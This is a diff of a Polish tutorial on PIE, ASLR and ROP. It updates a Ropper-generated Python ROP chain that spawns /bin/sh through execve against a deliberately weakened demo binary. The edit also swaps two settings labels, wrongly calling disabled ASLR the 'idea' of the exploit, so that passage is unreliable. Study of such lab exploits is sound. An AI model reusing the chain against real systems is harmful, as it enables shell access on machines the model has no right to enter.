@@ -16,7 +16,8 @@ W przypadku pliku z PIE liczone są offsety.
 
 ![img_4.png](img/img_4.png)
 
-Widzimy to w sposobie adresacji binarki.
+Widać
+to w sposobie adresacji binarki.
 
 Wpływ PIE na performance aplikacji jest dość duży. Biorąc za przykład architekturę 32bitową domyślnym zachowaniem kompilatora jest zarezerwowanie rejestru `ebx` jako adresu przetrzymującego adres tablicy GOT z której otrzymywane są pozostałe adresy. To generuje spadek performance'u - musimy ustalać adresy pośrednio.
 
@@ -141,7 +142,7 @@ W tym momencie exploit powinien działać i wywoływać funkcję secret.
 
 ![img_1.png](img/img_1.png)
 
-Exploit działa jeśli flaga od ASLR jest ustawiona na 0.
+Exploit działa jeśli flaga ASLR jest ustawiona na 0.
 
 W momencie ustawienia jej na 2 exploit nie działa - adres, który nadpisuję nie jest adresem funkcji `secret`. Program został załadowany pod inny adres.
 
@@ -161,14 +162,14 @@ Atakujący za pomocą ROP szuka małych fragmentów assemblera, które kończą 
 
 Z tych Gadgetów tworzy się łancuch realizujący, to co chce atakujący.
 
-Naszym zadaniem jest więc załadować do rejestrów odpowiednie wartości i wywołać `execve` za pomocą łańcucha takich Gadgetów nazywanego ROP chain.
+Moim zadaniem jest więc załadować do rejestrów odpowiednie wartości i wywołać `execve` za pomocą łańcucha takich Gadgetów nazywanego ROP chain.
 
 Kod exploitowanej aplikacji:
 
 Kompilacja:
 - **PIE**: wyłączony - PIE został wyłączony, aby Gadgety znajdujące się w kodzie były na stałych miejsach.
-- **ASLR**: bez znaczenia - statycznie zlinkowane biblioteki bez PIE bedą na stałych adresach, stos nie jest używany
-- **EXEC**: wyłączony - jest to idea tego exploitu.
+- **EXEC**: bez znaczenia - statycznie zlinkowane biblioteki bez PIE bedą na stałych adresach, stos nie jest używany
+- **ASLR**: wyłączony - jest to idea tego exploitu.
 - **CANARY**: wyłączony - kanarek nie pozwoliłby nadpisać adresu powrotu, zajmiemy się nim w dalszej cześci.
 
 ```c
@@ -218,7 +219,7 @@ from struct import pack
 
 p = lambda x : pack('I', x)
 
-IMAGE_BASE_0 = 0x08048000 # ade5c9e073d78d750536f242e5b5c082c8863de711944f837ee60f082fb751ec
+IMAGE_BASE_0 = 0x08048000 # c7fd8b0f7cb07554b7f8e67b396605fa8c500b11beb0fb80ec3e797bfd8338ec
 rebase_0 = lambda x : p(x + IMAGE_BASE_0)
 
 rop = 'a'*28
@@ -227,7 +228,7 @@ rop += rebase_0(0x00001743) # 0x08049743: pop edi; ret;
 rop += '//bi'
 rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret; 
 rop += rebase_0(0x0009b060)
-rop += rebase_0(0x0004621d) # 0x0808e21d: mov dword ptr [ebx], edi; pop ebx; pop esi; pop edi; ret; 
+rop += rebase_0(0x000462fd) # 0x0808e2fd: mov dword ptr [ebx], edi; pop ebx; pop esi; pop edi; ret; 
 rop += p(0xdeadbeef)
 rop += p(0xdeadbeef)
 rop += p(0xdeadbeef)
@@ -235,37 +236,38 @@ rop += rebase_0(0x00001743) # 0x08049743: pop edi; ret;
 rop += 'n/sh'
 rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret; 
 rop += rebase_0(0x0009b064)
-rop += rebase_0(0x0004621d) # 0x0808e21d: mov dword ptr [ebx], edi; pop ebx; pop esi; pop edi; ret; 
+rop += rebase_0(0x000462fd) # 0x0808e2fd: mov dword ptr [ebx], edi; pop ebx; pop esi; pop edi; ret; 
 rop += p(0xdeadbeef)
 rop += p(0xdeadbeef)
 rop += p(0xdeadbeef)
-rop += rebase_0(0x000078e0) # 0x0804f8e0: xor eax, eax; ret; 
-rop += rebase_0(0x0001d51e) # 0x0806551e: pop edx; pop ebx; pop esi; ret; 
+rop += rebase_0(0x00007920) # 0x0804f920: xor eax, eax; ret; 
+rop += rebase_0(0x0001d55e) # 0x0806555e: pop edx; pop ebx; pop esi; ret; 
 rop += rebase_0(0x0009b068)
 rop += p(0xdeadbeef)
 rop += p(0xdeadbeef)
-rop += rebase_0(0x00016eda) # 0x0805eeda: mov dword ptr [edx], eax; ret; 
+rop += rebase_0(0x00016f1a) # 0x0805ef1a: mov dword ptr [edx], eax; ret; 
 rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret; 
 rop += rebase_0(0x0009b060)
-rop += rebase_0(0x0001b701) # 0x08063701: pop ecx; add al, 0xf6; ret; 
+rop += rebase_0(0x0001b741) # 0x08063741: pop ecx; add al, 0xf6; ret; 
 rop += rebase_0(0x0009b068)
-rop += rebase_0(0x0004f965) # 0x08097965: pop edx; xor eax, eax; pop edi; ret; 
+rop += rebase_0(0x0004fa45) # 0x08097a45: pop edx; xor eax, eax; pop edi; ret; 
 rop += rebase_0(0x0009b068)
 rop += p(0xdeadbeef)
-rop += rebase_0(0x000078e0) # 0x0804f8e0: xor eax, eax; ret; 
-rop += rebase_0(0x00050280) # 0x08098280: add eax, 1; ret; 
-rop += rebase_0(0x00050280) # 0x08098280: add eax, 1; ret; 
-rop += rebase_0(0x00050280) # 0x08098280: add eax, 1; ret; 
-rop += rebase_0(0x00050280) # 0x08098280: add eax, 1; ret; 
-rop += rebase_0(0x00050280) # 0x08098280: add eax, 1; ret; 
-rop += rebase_0(0x00050280) # 0x08098280: add eax, 1; ret; 
-rop += rebase_0(0x00050280) # 0x08098280: add eax, 1; ret; 
-rop += rebase_0(0x00050280) # 0x08098280: add eax, 1; ret; 
-rop += rebase_0(0x00050280) # 0x08098280: add eax, 1; ret; 
-rop += rebase_0(0x00050280) # 0x08098280: add eax, 1; ret; 
-rop += rebase_0(0x00050280) # 0x08098280: add eax, 1; ret; 
-rop += rebase_0(0x00030e30) # 0x08078e30: int 0x80; ret; 
+rop += rebase_0(0x00007920) # 0x0804f920: xor eax, eax; ret; 
+rop += rebase_0(0x00050360) # 0x08098360: add eax, 1; ret; 
+rop += rebase_0(0x00050360) # 0x08098360: add eax, 1; ret; 
+rop += rebase_0(0x00050360) # 0x08098360: add eax, 1; ret; 
+rop += rebase_0(0x00050360) # 0x08098360: add eax, 1; ret; 
+rop += rebase_0(0x00050360) # 0x08098360: add eax, 1; ret; 
+rop += rebase_0(0x00050360) # 0x08098360: add eax, 1; ret; 
+rop += rebase_0(0x00050360) # 0x08098360: add eax, 1; ret; 
+rop += rebase_0(0x00050360) # 0x08098360: add eax, 1; ret; 
+rop += rebase_0(0x00050360) # 0x08098360: add eax, 1; ret; 
+rop += rebase_0(0x00050360) # 0x08098360: add eax, 1; ret; 
+rop += rebase_0(0x00050360) # 0x08098360: add eax, 1; ret; 
+rop += rebase_0(0x00030e70) # 0x08078e70: int 0x80; ret; 
 print rop
+
 ```
 
 Kod wygenerowany przez Ropper realizuje wywołanie funkcji `execve` z `bin/sh`.
@@ -282,12 +284,7 @@ Komenda ta w sprytny sposób sprawia, że otrzymany shell nie dostaje `EOF` i je
 
 W podanym przykładzie biblioteki zlinkowane są statycznie przez co ich adres pozostaje taki sam. W przypadku linkowania dynamicznego wraz z włączonym ASLR atak ten staje sie znacznie trudniejszy. W tym przypadku exploit nie działa z dynamicznym linkowaniem. Nie można kompilować jednoczesnie z flaga PIE i static.
 
-### 5. Proof of concept - ręczny ROP
 
-Zmotywowany przez `@dadurek` postanowiłem udowodnić, że ROP jest wykonywalny ręcznie i pewnie bardziej optymalny od zautomatyzowanego.
-
-Kod aplikacji pozostaje ten sam.
-
-### 6. Wnioski
+### 5. Wnioski
 
 PIE i ASLR są technikami bardzo komplementarnymi i używanie ich razem daje największą ochronę przed atakami, które używają skakania pomiędzy sekcjami oraz offsetów w adresowaniu.
